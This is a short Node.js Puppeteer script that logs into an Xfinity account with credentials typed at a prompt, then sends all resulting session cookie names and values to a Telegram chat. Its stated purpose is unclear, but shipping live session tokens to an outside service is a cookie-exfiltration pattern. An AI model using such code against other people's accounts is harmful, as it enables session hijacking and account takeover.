// xfinity_auto.js
const puppeteer = require('puppeteer');
const { sendTelegramMessage, prompt } = require('./utils');

async function main() {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  const username = await prompt('Xfinity Username: ');
  const password = await prompt('Xfinity Password: ');

  try {
    await page.goto('https://login.xfinity.com/login', { waitUntil: 'networkidle2' });
    await page.waitForSelector('input[name="user"]');
    await page.type('input[name="user"]', username, { delay: 50 });
    await page.click('button[type="submit"]');
    await page.waitForSelector('input[name="password"]');
    await page.type('input[name="password"]', password, { delay: 50 });
    await page.click('button[type="submit"]');
    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    const cookies = await page.cookies();

    let msg = '*Xfinity Cookies:*\n';
    if (cookies.length === 0) msg += 'No cookies found.';
    else cookies.forEach(c => { msg += `${c.name} = ${c.value}\n`; });
    await sendTelegramMessage(msg);
  } catch (err) {
    await sendTelegramMessage(`Xfinity login failed: ${err.message}`);
  }

  await browser.close();
}

main();